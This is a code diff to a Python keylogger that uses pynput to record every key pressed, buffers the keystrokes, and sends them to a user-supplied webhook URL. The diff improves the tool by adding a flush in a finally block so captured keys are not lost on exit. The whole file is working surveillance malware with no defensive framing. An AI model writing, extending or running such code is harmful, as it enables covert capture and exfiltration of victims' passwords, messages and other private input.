@@ -3,7 +3,9 @@
 import requests
 from pynput import keyboard
 
-WEBHOOK = "" #replace with yours
+WEBHOOK = "" #put yours here
+
+buffah = ""
 def req(text):
     payload = {"content": f"```\n{text}\n```"}
     try:
@@ -25,5 +27,10 @@ def press(key):
         req(buffah)
         buffah = ""
 
-with keyboard.Listener(on_press=press) as listener:
-    listener.join()
+try:
+    with keyboard.Listener(on_press=press) as listener:
+        listener.join()
+
+finally:
+    if buffah:
+        req(buffah)
